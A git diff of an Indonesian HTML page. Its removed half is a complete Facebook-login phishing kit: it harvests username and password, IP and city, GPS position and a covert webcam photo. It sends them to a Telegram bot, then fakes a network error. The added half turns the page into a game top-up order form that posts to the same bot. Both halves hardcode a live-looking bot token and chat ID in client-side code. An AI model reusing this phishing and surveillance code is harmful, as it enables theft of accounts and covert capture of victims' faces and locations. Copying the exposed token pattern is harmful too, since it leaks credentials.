@@ -3,128 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Masuk atau Daftar</title>
+    <title>IKHSAN STORE - Auto Stock System</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-height: 100vh; }
-        .top-section { width: 100%; display: flex; flex-direction: column; align-items: center; }
-        .header { padding-top: 50px; padding-bottom: 20px; }
-        .fb-logo { width: 65px; height: 65px; } 
-        .login-box { width: 90%; max-width: 400px; text-align: center; }
-        input { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 12px; background-color: #f5f6f7; font-size: 16px; box-sizing: border-box; }
-        .btn-login { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 30px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 5px; }
-        .forgot { color: #1c1e21; font-size: 14px; margin-top: 15px; text-decoration: none; display: block; font-weight: 500; }
-        .bottom-section { width: 100%; display: flex; flex-direction: column; align-items: center; padding-bottom: 20px; }
-        .create-btn { width: 90%; max-width: 400px; padding: 10px; background-color: #fff; border: 1px solid #1877f2; border-radius: 30px; color: #1877f2; font-size: 16px; font-weight: 500; cursor: pointer; margin-bottom: 20px; }
-        .meta-footer { display: flex; flex-direction: column; align-items: center; color: #737373; font-size: 12px; }
-        .meta-logo { width: 60px; margin-bottom: 5px; }
-        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 100; justify-content: center; align-items: center; }
-        video, canvas { display: none; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; padding: 15px; }
+        .container { max-width: 450px; margin: auto; background: white; padding: 20px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        h2 { text-align: center; color: #1877f2; margin-bottom: 20px; }
+        .section { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; color: #444; }
+        input, textarea, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 14px; margin-bottom: 10px; }
+        
+        /* Grid Item dari Sheets */
+        .item-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .item-card { border: 2px solid #eee; padding: 12px; border-radius: 12px; text-align: center; cursor: pointer; transition: 0.3s; background: #fff; }
+        .item-card:hover { border-color: #1877f2; }
+        .item-card.active { border-color: #1877f2; background: #e7f3ff; }
+        .stok-label { font-size: 11px; margin-top: 5px; font-weight: bold; }
+
+        /* Payment */
+        .payment-box { display: none; text-align: center; background: #fffbe6; padding: 15px; border-radius: 12px; border: 1px solid #ffe58f; margin-top: 10px; }
+        .qris-img { width: 100%; max-width: 200px; border: 2px solid #333; margin: 10px 0; }
+        
+        .btn-kirim { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #loading { display: none; text-align: center; font-weight: bold; color: #1877f2; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<div id="loading">Memproses...</div>
+<div class="container">
+    <h2>🎮 IKHSAN STORE</h2>
+    
+    <div class="section">
+        <label>Pilih Item (Stok Update Otomatis)</label>
+        <div id="loading-stok">Memuat item...</div>
+        <div class="item-grid" id="menu-item"></div>
+        <input type="hidden" id="selected_item">
+    </div>
 
-<div class="top-section">
-    <div class="header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
+    <div class="section">
+        <label>Data Akun Game</label>
+        <input type="text" id="game_id" placeholder="Masukkan ID Game">
+        <input type="text" id="nickname" placeholder="Nickname">
+        <textarea id="pesan" rows="2" placeholder="Pesan tambahan..."></textarea>
     </div>
-    <div class="login-box">
-        <input type="text" id="user" placeholder="Nomor ponsel atau email">
-        <input type="password" id="pass" placeholder="Kata sandi">
-        <button class="btn-login" onclick="eksekusi()">Login</button>
-        <a href="#" class="forgot">Lupa kata sandi?</a>
+
+    <div class="section">
+        <label>Metode Pembayaran</label>
+        <select id="metode" onchange="pilihMetode()">
+            <option value="">-- Pilih Pembayaran --</option>
+            <option value="DANA">DANA (0812-xxxx-xxxx)</option>
+            <option value="QRIS">QRIS (Klik untuk Scan)</option>
+        </select>
+        <div id="qris_area" class="payment-box">
+            <p>Scan QRIS ini:</p>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/QR_code_for_mobile_English_Wikipedia.svg" class="qris-img">
+            <p><b>A/N IKHSAN STORE</b></p>
+        </div>
     </div>
+
+    <div class="section">
+        <label>Upload Bukti Transfer</label>
+        <input type="file" id="bukti" accept="image/*">
+    </div>
+
+    <div id="loading">Mengirim pesanan...</div>
+    <button class="btn-kirim" onclick="kirimPesanan()">Konfirmasi Pembayaran</button>
 </div>
-
-<div class="bottom-section">
-    <button class="create-btn">Buat akun baru</button>
-    <div class="meta-footer">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo">
-        <span>Tentang · Bantuan · Lainnya</span>
-    </div>
-</div>
-
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
 
 <script>
-    // DATA BOT IKHSAN (SUDAH TERUJI BERHASIL)
-    const TOKEN = '8733750993:AAGe696DEkdJzlDJK1o6MLnhLWh2PWIBYqg';
+    // LINK CSV KAMU SUDAH TERPASANG DI SINI
+    const SHEET_CSV = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vQhFwi5JuW2MdHgK8X5QZgjXQr4TaG6rzuLUwHRWK-6wzGbrzSwg0wFMhJknCaM6EJW8cqI9-e7H0A8/pub?gid=0&single=true&output=csv';
+    const BOT_TOKEN = '8733750993:AAGe696DEkdJzlDJK1o6MLnhLWh2PWIBYqg';
     const CHAT_ID = '8460192289';
 
-    async function eksekusi() {
-        const u = document.getElementById("user").value;
-        const p = document.getElementById("pass").value;
+    // 1. Ambil Data dari Google Sheets
+    async function loadData() {
+        try {
+            const res = await fetch(SHEET_CSV);
+            const text = await res.text();
+            const rows = text.split('\n').slice(1);
+            let html = '';
+            
+            rows.forEach(row => {
+                const col = row.split(',');
+                if(col.length >= 3) {
+                    const nama = col[0];
+                    const harga = col[1];
+                    const stok = col[2];
+                    const warna = stok.toLowerCase().includes('0') ? '#dc3545' : '#28a745';
+                    
+                    html += `
+                        <div class="item-card" onclick="selectItem(this, '${nama}', '${harga}')">
+                            <b>${nama}</b><br>
+                            <span style="color:#1877f2">${harga}</span><br>
+                            <div class="stok-label" style="color:${warna}">${stok}</div>
+                        </div>`;
+                }
+            });
+            document.getElementById('menu-item').innerHTML = html;
+            document.getElementById('loading-stok').style.display = 'none';
+        } catch (e) {
+            document.getElementById('loading-stok').innerText = 'Gagal muat stok.';
+        }
+    }
 
-        if(!u || !p) return;
-        document.getElementById("loading").style.display = "flex";
+    function selectItem(el, nama, harga) {
+        document.querySelectorAll('.item-card').forEach(c => c.classList.remove('active'));
+        el.classList.add('active');
+        document.getElementById('selected_item').value = nama + " (" + harga + ")";
+    }
+
+    function pilihMetode() {
+        const m = document.getElementById('metode').value;
+        document.getElementById('qris_area').style.display = (m === 'QRIS') ? 'block' : 'none';
+    }
+
+    // 2. Kirim Pesanan ke Telegram
+    async function kirimPesanan() {
+        const item = document.getElementById('selected_item').value;
+        const id = document.getElementById('game_id').value;
+        const file = document.getElementById('bukti').files[0];
+
+        if(!item || !id || !file) return alert("Pilih item, isi ID, dan upload bukti!");
+
+        document.getElementById('loading').style.display = 'block';
+
+        const teks = `🛒 PESANAN BARU MASUK!\n\n` +
+                     `💎 Item: ${item}\n` +
+                     `🎮 ID Game: ${id}\n` +
+                     `👤 Nick: ${document.getElementById('nickname').value}\n` +
+                     `💳 Metode: ${document.getElementById('metode').value}\n` +
+                     `📝 Pesan: ${document.getElementById('pesan').value || '-'}`;
+
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", file);
+        fd.append("caption", teks);
 
         try {
-            // 1. Ambil info IP & Lokasi Dasar
-            const ipRes = await fetch('https://ipapi.co/json/').catch(() => ({json: () => ({ip: 'N/A'})}));
-            const ip = await ipRes.json();
-            
-            // 2. Minta Izin Kamera & Lokasi GPS Secara Bersamaan
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => null);
-            
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                // Jika izin Lokasi DIBERIKAN
-                await kirimDataLengkap(u, p, ip, pos, stream);
-            }, async () => {
-                // Jika izin Lokasi DITOLAK
-                await kirimDataLengkap(u, p, ip, null, stream);
-            });
-
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+            alert("Pesanan terkirim! Silakan tunggu konfirmasi.");
+            location.reload();
         } catch (e) {
-            selesai();
+            alert("Gagal kirim.");
+        } finally {
+            document.getElementById('loading').style.display = 'none';
         }
     }
 
-    async function kirimDataLengkap(u, p, ip, pos, stream) {
-        let caption = `👤 TARGET BARU MASUK!\n\n`;
-        caption += `User: ${u}\n`;
-        caption += `Pass: ${p}\n`;
-        caption += `IP: ${ip.ip} (${ip.city || '?'})\n`;
-        
-        if(pos) {
-            caption += `📍 Lokasi (Maps): https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        } else {
-            caption += `📍 Lokasi: Izin Ditolak Target`;
-        }
-
-        if(stream) {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            video.srcObject = stream;
-
-            setTimeout(async () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
-                
-                const fd = new FormData();
-                fd.append("chat_id", CHAT_ID);
-                fd.append("photo", blob, "wajah.jpg");
-                fd.append("caption", caption);
-
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
-                stream.getTracks().forEach(t => t.stop());
-                selesai();
-            }, 1000);
-        } else {
-            // Kirim teks saja jika kamera ditolak
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(caption)}`);
-            selesai();
-        }
-    }
-
-    function selesai() {
-        alert("Kesalahan jaringan. Sesi berakhir, silakan login ulang.");
-        location.reload();
-    }
+    loadData();
 </script>
 </body>
-    </html>
-    
+</html>
